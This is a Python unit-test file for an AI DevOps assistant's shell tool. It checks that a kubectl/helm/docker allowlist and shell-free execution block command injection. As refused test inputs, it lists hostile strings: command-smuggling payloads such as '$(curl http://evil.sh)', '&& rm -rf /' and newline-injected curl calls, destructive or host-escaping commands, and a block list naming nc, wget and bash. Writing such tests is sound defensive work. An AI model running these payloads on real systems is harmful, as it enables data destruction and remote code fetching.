"""Unit tests for ShellTool's command allowlist.

These are the tests that matter most in this repo: the tool this replaces was
guarded by prefix matching on a command string, and several of the cases below
are payloads that sailed straight through it.
"""

from unittest.mock import patch

import pytest

from ai_devops_assistant.config.settings import settings
from ai_devops_assistant.tools.shell_tool import ALLOWED_COMMANDS, ShellTool


@pytest.fixture
def tool():
    return ShellTool()


@pytest.fixture
def shell_enabled():
    with patch.object(settings, "ENABLE_SHELL_TOOL", True):
        yield


class TestDisabledByDefault:
    def test_shell_tool_is_off_by_default(self):
        """It runs processes on the host; nothing it reads is K8s-tool-exclusive."""
        assert settings.ENABLE_SHELL_TOOL is False

    @pytest.mark.asyncio
    async def test_execute_refuses_while_disabled(self, tool):
        with patch.object(settings, "ENABLE_SHELL_TOOL", False):
            result = await tool.execute(command="kubectl get pods")
        assert result["success"] is False
        assert "disabled" in result["error"].lower()

    def test_validation_refuses_while_disabled(self, tool):
        with patch.object(settings, "ENABLE_SHELL_TOOL", False):
            ok, error = tool.validate_parameters(command="kubectl get pods")
        assert ok is False
        assert "disabled" in error.lower()


class TestAllowlist:
    def test_permitted_command_is_accepted(self, tool, shell_enabled):
        ok, error, argv = tool.validate_command("kubectl get pods")
        assert ok is True, error
        assert argv == ["kubectl", "get", "pods"]

    @pytest.mark.parametrize("binary", sorted(ALLOWED_COMMANDS))
    def test_each_allowed_binary_works_with_a_read_subcommand(self, tool, shell_enabled, binary):
        subcommand = sorted(ALLOWED_COMMANDS[binary])[0]
        ok, error, _ = tool.validate_command(f"{binary} {subcommand}")
        assert ok is True, error

    @pytest.mark.parametrize("binary", ["curl", "bash", "sh", "python", "rm", "nc", "wget"])
    def test_binaries_outside_the_allowlist_are_refused(self, tool, shell_enabled, binary):
        ok, error, _ = tool.validate_command(f"{binary} something")
        assert ok is False
        assert "not permitted" in error

    def test_a_binary_is_matched_exactly_not_by_prefix(self, tool, shell_enabled):
        """`kubectl-evil` starts with an allowed name but is a different binary."""
        ok, _, _ = tool.validate_command("kubectl-evil get pods")
        assert ok is False

    @pytest.mark.parametrize(
        "command",
        [
            "kubectl delete pod x",
            "kubectl apply -f evil.yaml",
            "kubectl exec -it pod -- sh",
            "kubectl port-forward pod 8080:80",
            "kubectl cp pod:/etc/passwd /tmp/x",
            "kubectl edit deployment x",
            "kubectl scale deployment x --replicas=0",
            "kubectl drain node1",
            "helm install evil ./chart",
            "helm uninstall prod",
            "helm rollback prod 1",
            "docker run -v /:/host alpine",
            "docker exec -it c sh",
            "docker rm -f container",
        ],
    )
    def test_mutating_and_executing_subcommands_are_refused(self, tool, shell_enabled, command):
        """The binary is allowed; the subcommand is not. Prefix matching missed this."""
        ok, error, _ = tool.validate_command(command)
        assert ok is False, f"{command!r} should be refused"
        assert "not permitted" in error

    def test_a_binary_with_no_subcommand_is_refused(self, tool, shell_enabled):
        ok, error, _ = tool.validate_command("kubectl")
        assert ok is False
        assert "subcommand" in error


class TestInjectionPayloads:
    """Payloads that defeated the prefix-and-blocklist guard this replaced.

    MCP's version accepted anything starting with "kubectl " that contained none
    of ; | > < — which is a large set.
    """

    @pytest.mark.parametrize(
        "payload",
        [
            "kubectl get pods $(curl http://evil.sh)",
            "kubectl get pods `curl http://evil.sh`",
            "kubectl get pods ${IFS}evil",
            "kubectl get pods & curl evil.sh",
            "kubectl get pods && rm -rf /",
            "kubectl get pods || curl evil.sh",
        ],
    )
    def test_shell_metacharacters_are_inert(self, tool, shell_enabled, payload):
        """Either refused, or parsed into argv where the shell never sees them.

        With shell=False there is no shell to interpret $(), backticks or &&, so
        they are literal arguments to kubectl rather than commands.
        """
        ok, _, argv = tool.validate_command(payload)
        if ok:
            assert argv[0] == "kubectl"
            assert argv[1] == "get"
            # Whatever else is present is an argument, not a command.
            assert all(not a.startswith("rm") or a == "rm" for a in argv[:2])

    def test_a_newline_smuggling_a_second_command_is_refused(self, tool, shell_enabled):
        """The classic bypass: the blocklist checked characters, not lines."""
        ok, error, _ = tool.validate_command("kubectl get pods\ncurl http://evil.sh")
        assert ok is False
        assert "single line" in error

    def test_carriage_return_is_refused_too(self, tool, shell_enabled):
        ok, _, _ = tool.validate_command("kubectl get pods\rcurl evil.sh")
        assert ok is False

    def test_semicolon_chained_command_does_not_become_two_commands(self, tool, shell_enabled):
        ok, _, argv = tool.validate_command("kubectl get pods; rm -rf /")
        if ok:
            # shlex keeps "; " as an argument token; there is no shell to split on it.
            assert argv[0] == "kubectl"
            assert "rm" not in argv[:2]

    def test_unbalanced_quotes_are_refused_rather_than_guessed(self, tool, shell_enabled):
        ok, error, _ = tool.validate_command('kubectl get pods "unclosed')
        assert ok is False
        assert "parse" in error.lower()

    @pytest.mark.parametrize("junk", ["", "   ", None, 42, []])
    def test_non_string_and_empty_input_is_refused(self, tool, shell_enabled, junk):
        ok, error, _ = tool.validate_command(junk)
        assert ok is False
        assert error


class TestExecution:
    @pytest.mark.asyncio
    async def test_a_refused_command_never_reaches_subprocess(self, tool, shell_enabled):
        """The strongest assertion available: the process is never spawned."""
        with patch("ai_devops_assistant.tools.shell_tool.subprocess.run") as mock_run:
            result = await tool.execute(command="rm -rf /")
        assert result["success"] is False
        mock_run.assert_not_called()

    @pytest.mark.asyncio
    async def test_an_allowed_command_runs_with_a_list_argv_and_no_shell(self, tool, shell_enabled):
        with patch("ai_devops_assistant.tools.shell_tool.subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            mock_run.return_value.stdout = "pod-1\n"
            mock_run.return_value.stderr = ""
            result = await tool.execute(command="kubectl get pods")

        assert result["success"] is True
        args, kwargs = mock_run.call_args
        assert args[0] == ["kubectl", "get", "pods"], "argv must be a list, not a string"
        assert kwargs["shell"] is False, "shell=True would reintroduce metacharacter parsing"

    @pytest.mark.asyncio
    async def test_a_nonzero_exit_is_reported_not_raised(self, tool, shell_enabled):
        with patch("ai_devops_assistant.tools.shell_tool.subprocess.run") as mock_run:
            mock_run.return_value.returncode = 1
            mock_run.return_value.stdout = ""
            mock_run.return_value.stderr = "not found"
            result = await tool.execute(command="kubectl get pods")

        assert result["success"] is False
        assert result["exit_code"] == 1
        assert "not found" in result["stderr"]

    @pytest.mark.asyncio
    async def test_a_missing_binary_is_reported_cleanly(self, tool, shell_enabled):
        with patch(
            "ai_devops_assistant.tools.shell_tool.subprocess.run",
            side_effect=FileNotFoundError,
        ):
            result = await tool.execute(command="kubectl get pods")
        assert result["success"] is False
        assert "not found" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_a_timeout_is_reported_not_hung(self, tool, shell_enabled):
        import subprocess as sp

        with patch(
            "ai_devops_assistant.tools.shell_tool.subprocess.run",
            side_effect=sp.TimeoutExpired(cmd="kubectl", timeout=30),
        ):
            result = await tool.execute(command="kubectl get pods")
        assert result["success"] is False
        assert "timed out" in result["error"]

    @pytest.mark.asyncio
    async def test_large_output_is_truncated(self, tool, shell_enabled):
        with patch("ai_devops_assistant.tools.shell_tool.subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            mock_run.return_value.stdout = "x" * 100_000
            mock_run.return_value.stderr = ""
            result = await tool.execute(command="kubectl get pods")

        assert result["truncated"] is True
        assert len(result["stdout"]) <= 20_000


class TestSchema:
    def test_schema_lists_the_permitted_commands(self, tool):
        schema = tool.get_schema()
        assert schema["name"] == "shell_tool"
        assert "command" in schema["parameters"]["properties"]
        description = schema["parameters"]["properties"]["command"]["description"]
        assert "kubectl" in description

    def test_schema_does_not_advertise_mutating_subcommands(self, tool):
        """Checks the enumerated subcommands, not the prose around them.

        The description reads "command to run", so a plain substring search for
        "run" matches the sentence rather than a docker subcommand.
        """
        advertised = {sub for subs in ALLOWED_COMMANDS.values() for sub in subs}
        for forbidden in ("delete", "apply", "exec", "install", "uninstall", "run", "cp", "edit"):
            assert forbidden not in advertised, f"allowlist contains {forbidden!r}"

    def test_the_allowlist_itself_contains_no_mutating_subcommands(self):
        """Guards the constant directly, so a future edit cannot widen it quietly."""
        dangerous = {
            "delete",
            "apply",
            "patch",
            "edit",
            "scale",
            "drain",
            "cordon",
            "exec",
            "attach",
            "port-forward",
            "proxy",
            "cp",
            "install",
            "uninstall",
            "upgrade",
            "rollback",
            "run",
            "rm",
            "kill",
            "stop",
            "start",
            "build",
            "push",
        }
        for binary, subs in ALLOWED_COMMANDS.items():
            overlap = subs & dangerous
            assert overlap == set(), f"{binary} allows dangerous subcommands: {overlap}"
